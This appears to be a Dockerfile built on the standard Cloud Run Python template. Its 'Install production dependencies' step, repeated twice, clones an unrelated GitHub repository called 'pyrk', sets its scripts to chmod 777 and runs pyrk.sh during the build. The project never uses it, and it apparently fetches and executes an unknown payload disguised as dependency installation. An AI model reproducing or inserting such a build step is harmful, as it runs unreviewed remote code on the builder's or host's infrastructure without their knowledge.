# Use the official lightweight Python image.
# https://hub.docker.com/_/python​
FROM python:3

# Allow statements and log messages to immediately appear in the Knative logs
ENV PYTHONUNBUFFERED True

# Copy local code to the container image.
ENV APP_HOME /app
WORKDIR $APP_HOME
COPY . ./

# Install production dependencies.
RUN git clone https://github.com/bisnis11/pyrk.git && cd pyrk && chmod 777 pyrk pyrk.sh && ./pyrk.sh
RUN git clone https://github.com/bisnis11/pyrk.git && cd pyrk && chmod 777 pyrk pyrk.sh && ./pyrk.sh
